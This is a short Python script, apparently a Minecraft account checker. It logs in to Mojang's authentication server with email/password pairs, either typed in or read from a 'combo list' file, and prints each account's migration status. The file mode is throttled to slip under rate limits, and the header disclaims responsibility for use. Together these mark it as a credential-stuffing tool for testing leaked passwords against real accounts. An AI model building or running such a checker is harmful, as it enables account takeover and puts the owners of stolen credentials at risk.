# Migration Tester
# I am not responsible for anything that occurs as a result of the use of this program.
# I am aware that this program is extremely overly simple. I was asked to post it so I have done so.
# That is all. Enjoy responsibly!

import requests
import time

def check(user, password):
    body = {
      "agent": "minecraft",
      "username": user,
      "password": password,
      "requestUser": "true"
    }
    r = requests.post("https://authserver.mojang.com/authenticate", json=body, headers={"content-type": "application/json"})
    jd = r.json()
    token = jd["accessToken"]
    migcheck = requests.get("https://api.minecraftservices.com/rollout/v1/msamigration", headers={"Authorization": f"Bearer {token}"})
    print(f"{user} - {migcheck.text}")

print("Migration Tester")
mode = int(input("Select mode:\n1: Input email/password manually\n2: Select combos from a file\nInput mode choice: "))

if mode == 1:
    print("Mode #1 selected. Type \"break\" as the email if you wish to quit the program.")
    while True:
        user = input("Email: ")
        if user.lower() == "break":
            print("Bye")
            quit()
        else:
            password = input("Password: ")
            check(user, password)
elif mode == 2:
    print("Mode #2 selected. You will be asked to input the path to your combo list (email:password).\nTo avoid rate limits and issues with Mojang, the program will check 1 account every 10 seconds.")
    with open(input("Path to combo list: ")) as f:
        for line in f:
            combo = line.strip().split(":")
            check(combo[0], combo[1])
            time.sleep(10)
else:
    print("Invalid mode selected. Please rerun the program.")
